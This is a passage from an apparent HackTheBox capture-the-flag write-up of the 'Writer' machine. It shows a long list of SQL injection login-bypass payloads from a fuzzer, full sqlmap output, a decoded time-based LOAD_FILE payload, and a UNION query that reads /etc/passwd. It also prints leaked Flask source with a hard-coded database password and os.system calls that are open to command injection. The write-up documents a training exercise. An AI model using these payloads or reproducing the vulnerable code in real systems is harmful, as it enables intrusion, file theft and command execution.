[2K    * UNAME: 0'<'2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '^''-- 2

[2K    * PASS: '^''-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '=''-- 2

[2K    * PASS: '=''-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '*''#

[2K    * PASS: '*''#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '^''#

[2K    * UNAME: '^''#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '*''-- 2

[2K    * PASS: '*''-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)#

[2K    * PASS: 'oR(2)#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2=2#

[2K    * PASS: 'oR/**/2=2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR'2'='2'oR'

[2K    * UNAME: 'oR'2'='2'oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2 oR'

[2K    * PASS: 'oR 2 oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)-- 2

[2K    * PASS: 'oR(2)-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)oR'

[2K    * PASS: 'oR(2)oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'-- 2

[2K    * PASS: 'oR'2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR true#

[2K    * PASS: 'oR true#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(true)-- 2

[2K    * PASS: 'oR(true)-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'='2' LimIT 1-- 2

[2K    * PASS: 'oR'2'='2' LimIT 1-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2=2/**/oR'

[2K    * PASS: 'oR/**/2=2/**/oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR true-- 2

[2K    * PASS: 'oR true-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'#

[2K    * PASS: 'oR'2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'='2'oR'

[2K    * PASS: 'oR'2'='2'oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR'2'='2'-- 2

[2K    * UNAME: 'oR'2'='2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR(2)=2#

[2K    * UNAME: 'oR(2)=2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2-- 2

[2K    * PASS: 'oR 2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'oR'

[2K    * PASS: 'oR'2'oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/true-- 2

[2K    * PASS: 'oR/**/true-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2=2#

[2K    * PASS: 'oR 2=2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(true)#

[2K    * PASS: 'oR(true)#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'='2'#

[2K    * PASS: 'oR'2'='2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR true oR'

[2K    * PASS: 'oR true oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR 2=2-- 2

[2K    * UNAME: 'oR 2=2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)=2-- 2

[2K    * PASS: 'oR(2)=2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2#

[2K    * PASS: 'oR/**/2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR/**/true/**/oR'

[2K    * UNAME: 'oR/**/true/**/oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/true#

[2K    * PASS: 'oR/**/true#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2=2-- 2

[2K    * PASS: 'oR/**/2=2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR(2)=(2)oR'

[2K    * UNAME: 'oR(2)=(2)oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2-- 2

[2K    * PASS: 'oR/**/2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2=2 oR'

[2K    * PASS: 'oR 2=2 oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'='2' LimIT 1#

[2K    * PASS: 'oR'2'='2' LimIT 1#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)LiKE(2)-- 2

[2K    * PASS: 'oR(2)LiKE(2)-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR'2'LiKE'2'oR'

[2K    * UNAME: 'oR'2'LiKE'2'oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(true)oR'

[2K    * PASS: 'oR(true)oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'LiKE'2'-- 2

[2K    * PASS: 'oR'2'LiKE'2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR/**/2/**/oR'

[2K    * PASS: 'oR/**/2/**/oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR'2'LiKE'2'#

[2K    * PASS: 'oR'2'LiKE'2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR 2#

[2K    * PASS: 'oR 2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: 'oR(2)LiKE(2)oR'

[2K    * PASS: 'oR(2)LiKE(2)oR'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: 'oR(2)LiKE(2)#

[2K    * UNAME: 'oR(2)LiKE(2)#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: admin'#

[2K    * PASS: admin'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: admin'-- 2

[2K    * UNAME: admin'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||'2'||'

[2K    * PASS: '||'2'||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2-- 2

[2K    * PASS: '||2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2#

[2K    * PASS: '||2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2||'

[2K    * PASS: '||2||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2=2-- 2

[2K    * PASS: '||2=2-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2=2#

[2K    * PASS: '||2=2#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||'2'='2'||'

[2K    * PASS: '||'2'='2'||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||(2)LiKE(2)||'

[2K    * PASS: '||(2)LiKE(2)||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '||(2)LiKE(2)#

[2K    * UNAME: '||(2)LiKE(2)#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2=2||'

[2K    * PASS: '||2=2||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '||'2'LiKE'2'||'

[2K    * UNAME: '||'2'LiKE'2'||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||'2'LiKE'2'-- 2

[2K    * PASS: '||'2'LiKE'2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||'2'LiKE'2'#

[2K    * PASS: '||'2'LiKE'2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||true||'

[2K    * PASS: '||true||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '||(2)LiKE(2)-- 2

[2K    * UNAME: '||(2)LiKE(2)-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||true#

[2K    * PASS: '||true#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||true-- 2

[2K    * PASS: '||true-- 2
```
Looks like we have few payload working try any payload and you will be logged in as admin.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801122338.png)
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210801122351.png)
so let's enumerate this more while running sqlmap in background.
### Sqlmap
So I intercepted the post request using the burpsuite and save it to a local file.
```bash
kali@kali:~/HackTheBox/Writer$ cat r.txt 
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

uname=admin&password=admin
```
After that I Ran sqlmap on that login form.
```bash
kali@kali:~/HackTheBox/Writer$ sqlmap -r r.txt --dbs --batch --level 5 --risk 3
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.10#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:25:59 /2021-08-01/

[02:25:59] [INFO] parsing HTTP request from 'r.txt'
[02:26:01] [INFO] testing connection to the target URL
[02:26:02] [INFO] testing if the target URL content is stable
[02:26:02] [INFO] target URL content is stable
[02:26:02] [INFO] testing if POST parameter 'uname' is dynamic
[02:26:02] [WARNING] POST parameter 'uname' does not appear to be dynamic
[02:26:03] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[02:26:03] [INFO] testing for SQL injection on POST parameter 'uname'
[02:26:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:26:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
got a refresh intent (redirect like response common to login pages) to '/dashboard'. Do you want to apply it from now on? [Y/n] Y
got a 302 redirect to 'http://writer.htb/'. Do you want to follow? [Y/n] Y
[02:26:26] [INFO] POST parameter 'uname' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=302)
[02:26:28] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[02:26:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[02:26:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[02:26:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[02:26:30] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[02:26:31] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[02:26:31] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[02:26:31] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[02:26:32] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[02:26:32] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:26:33] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:26:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:26:34] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:26:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:26:35] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:26:36] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:26:37] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[02:26:40] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[02:26:40] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[02:26:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[02:26:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[02:26:41] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[02:26:41] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[02:26:41] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[02:26:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[02:26:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[02:26:41] [INFO] testing 'Generic inline queries'
[02:26:41] [INFO] testing 'MySQL inline queries'
[02:26:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[02:26:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[02:26:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[02:26:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[02:26:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[02:26:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[02:27:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:27:13] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[02:27:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[02:27:59] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' injectable 
[02:27:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:27:59] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:28:18] [INFO] target URL appears to be UNION injectable with 6 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[02:29:44] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[02:29:44] [INFO] testing 'Generic UNION query (15) - 21 to 40 columns'
[02:29:54] [INFO] testing 'Generic UNION query (15) - 41 to 60 columns'
[02:30:03] [INFO] testing 'Generic UNION query (15) - 61 to 80 columns'
[02:30:10] [INFO] testing 'Generic UNION query (15) - 81 to 100 columns'
[02:30:18] [INFO] testing 'MySQL UNION query (15) - 1 to 20 columns'
[02:31:01] [INFO] testing 'MySQL UNION query (15) - 21 to 40 columns'
[02:31:14] [INFO] testing 'MySQL UNION query (15) - 41 to 60 columns'
[02:31:26] [INFO] testing 'MySQL UNION query (15) - 61 to 80 columns'
[02:31:32] [INFO] testing 'MySQL UNION query (15) - 81 to 100 columns'
[02:31:41] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[02:31:41] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 399 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-5059' OR 5521=5521-- GmkC&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: uname=admin' AND SLEEP(5)-- RZDj&password=admin
---
[02:32:13] [INFO] the back-end DBMS is MySQL
[02:32:14] [WARNING] reflective value(s) found and filtering out
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
back-end DBMS: MySQL >= 5.0.12 (TiDB fork)
[02:32:15] [INFO] fetching database names
[02:32:15] [INFO] fetching number of databases
[02:32:15] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval

[02:32:15] [INFO] retrieved: 

[02:32:19] [INFO] retrieved: [02:32:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[02:32:21] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[02:32:21] [ERROR] unable to retrieve the number of databases
[02:32:21] [INFO] falling back to current database
[02:32:21] [INFO] fetching current database

[02:32:21] [INFO] retrieved: 

[02:34:18] [INFO] retrieved: 
[02:34:20] [CRITICAL] unable to retrieve the database names
[02:34:20] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/writer.htb'
[02:34:20] [WARNING] your sqlmap version is outdated

[*] ending @ 02:34:20 /2021-08-01/
```
Looks like we have SQL Injection but we cannot retrive database names which is annoying so let's try and read some files.
So we know that the it's time based blind sql injection so it will take up lot of time to get long file so I decided to check which payload sqlmap uses for the injection and play around with that payload manually to read some files.
I used wireshark to get the exact payload that sqlmap used I used wireshark to capture traffic on my tun0 interface which looked like.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805102726.png)
Then I picked up a POST request to /administrative endpoint that has a payload and followed it's TCP stream.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805102841.png)
and we have the payload.
```bash
UNAME%27%20AND%20%28SELECT%201088%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28IFNULL%28CAST%28HEX%28LOAD_FILE%280x2f6574632f686f73746e616d65%29%29%20AS%20NCHAR%29%2C0x20%29%29%2C6%2C1%29%29%3E57%2C0%2C1%29%29%29%29%29ZDPK%29%20AND%20%27GIYW%27%3D%27GIYW
```
URL Decoding the payload will make it more redable.
```bash
UNAME' AND (SELECT 1088 FROM (SELECT(SLEEP(1-(IF(ORD(MID((IFNULL(CAST(HEX(LOAD_FILE(0x2f6574632f686f73746e616d65)) AS NCHAR),0x20)),6,1))>57,0,1)))))ZDPK) AND 'GIYW'='GIYW
```
and there is still few hex numbers in the there so let's get them sorted also.
```bash
kali@kali:~/HackTheBox/Writer$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(bytes.fromhex('2f6574632f686f73746e616d65'))
b'/etc/hostname'
>>> print(bytes.fromhex('20'))
b' '
```
So the final payload looks like as follow.
```bash
UNAME' AND (SELECT 1088 FROM (SELECT(SLEEP(1-(IF(ORD(MID((IFNULL(CAST(HEX(LOAD_FILE(/etc/hostname)) AS NCHAR), )),6,1))>57,0,1)))))ZDPK) AND 'GIYW'='GIYW
```
so it is still the time based sql injection which can take a lot of time so, we have to think of some other techinique to get the files. One famous and extremly fast technique is using union statement so let's create the cascade of the main sql query.
# Exploitation
## Creating fast Working SQL query
So we know we will use union so we will use something like UNION ALL SELECT and then we know we have to use function readfile to readfiles from remote filesystem.
so that being said let's create a query.
### step 1 -> terminiating the ongoin query  
We have to use single quotes to terminate the query.
oops '
### step 2  -> Using UNION statement : 
UNION ALL SELECT 
### step 3 -> Adjusting No. of rows.
This is probably the trickiest step of all the steps.
As we know that the table will have atleat two columns uname and password it's best to start with that. so let's try that.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805104905.png)
So looks like our no. of columns is mismatched as we get incorrect credential when we get the no. of colums equal to the no. of colums in table we should be logged in.
Trying for all number of columns we get hit on 6 columns.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805105204.png)
so now we know the number of columns.
### step 4 -> Which column to inject so it returns the output.
So the answer to this lies in the above photo upon succesfully injecting the query we get the output 'welcome 1' so we know the content of column 2 is displayed so we have to inject that column.
0,{SOME SQL CODE},2,3,4,5
### step 5 -> Terminate the query
after you SQL query just terminate the query so it doesn't spit out the error.
## Final SQL query
Combining all the above steps to generate the sql query we get something like this.
```sql
oops' UNION ALL SELECT 0,LOAD_FILE('/etc/passwd'),2,3,4,5; --
```
So let's try that query.
And Boom we have fast SQL query to read files.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805105903.png)
So Now we can try few things we can try and search for passwords for most part we don't have much on this. [THERE IS THE UNINTENDED WAY BUT WE WILL KEEP DISTANCE FROM IT AS IT'S BASICALLY BRUTEFORCING]
So another thing we could do is just look for the source code of the website and try to find vuln in that.
So let's see the apache conf file to find the root directory of the installation of apache server.
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805111619.png)
Looks like the root directory is /var/www/writer.htb/writer/ and we have the path to .wsgi file so let's look at that first. /var/www/writer.htb/writer.wsgi
### writer.wsgi
```python
Welcome #!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,&#34;/var/www/writer.htb/&#34;)

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get(&#34;SECRET_KEY&#34;, &#34;&#34;)
```
so we know that it has __init__.py in app folder so let's hunt for that.
You find that file on /var/www/writer.htb/writer/__init__.py
![alt text](https://github.com/Debajyoti0-0/HackTheBox-Writeups/blob/main/Writer%20(HTB)/Pasted%20image%2020210805112348.png)
### __init__.py
```python
#!/usr/bin/env python3

from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
    try:
	connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
	return connector
    except mysql.connector.Error as err:
	if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
	    return ("Something is wrong with your db user name or password!")
	elif err.errno == errorcode.ER_BAD_DB_ERROR:
	    return ("Database does not exist")
	else:
	    return ("Another exception, returning!")
    else:
	print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
	return redirect('/')
    return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    if request.method == "POST":
	if request.files['image']:
	    image = request.files['image']
	    if ".jpg" in image.filename:
		path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
		image.save(path)
		image = "/img/{}".format(image.filename)
	    else:
		error = "File extensions must be in .jpg!"
		return render_template('add.html', error=error)

	if request.form.get('image_url'):
	    image_url = request.form.get('image_url')
	    if ".jpg" in image_url:
		try:
		    local_filename, headers = urllib.request.urlretrieve(image_url)
		    os.system("mv {} {}.jpg".format(local_filename, local_filename))
		    image = "{}.jpg".format(local_filename)
		    try:
			im = Image.open(image) 
			im.verify()
			im.close()
			image = image.replace('/tmp/','')
			os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
			image = "/img/{}".format(image)
		    except PIL.UnidentifiedImageError:
			os.system("rm {}".format(image))
			error = "Not a valid image file!"
			return render_template('add.html', error=error)
		except:
		    error = "Issue uploading picture"
		    return render_template('add.html', error=error)
	    else:
		error = "File extensions must be in .jpg!"
		return render_template('add.html', error=error)
	author = request.form.get('author')
	title = request.form.get('title')
	tagline = request.form.get('tagline')
	content = request.form.get('content')
	cursor = connector.cursor()
	cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
	result = connector.commit()
	return redirect('/dashboard/stories')
    else:
	return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    if request.method == "POST":
	cursor = connector.cursor()
	cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
	results = cursor.fetchall()
	if request.files['image']:
	    image = request.files['image']
	    if ".jpg" in image.filename:
		path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
		image.save(path)
		image = "/img/{}".format(image.filename)
		cursor = connector.cursor()
		cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
		result = connector.commit()
	    else:
		error = "File extensions must be in .jpg!"
		return render_template('edit.html', error=error, results=results, id=id)
	if request.form.get('image_url'):
	    image_url = request.form.get('image_url')
	    if ".jpg" in image_url:
		try:
		    local_filename, headers = urllib.request.urlretrieve(image_url)
		    os.system("mv {} {}.jpg".format(local_filename, local_filename))
		    image = "{}.jpg".format(local_filename)
		    try:
			im = Image.open(image) 
			im.verify()
			im.close()
			image = image.replace('/tmp/','')
			os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
			image = "/img/{}".format(image)
			cursor = connector.cursor()
			cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
			result = connector.commit()

		    except PIL.UnidentifiedImageError:
			os.system("rm {}".format(image))
			error = "Not a valid image file!"
			return render_template('edit.html', error=error, results=results, id=id)
		except:
		    error = "Issue uploading picture"
		    return render_template('edit.html', error=error, results=results, id=id)
	    else:
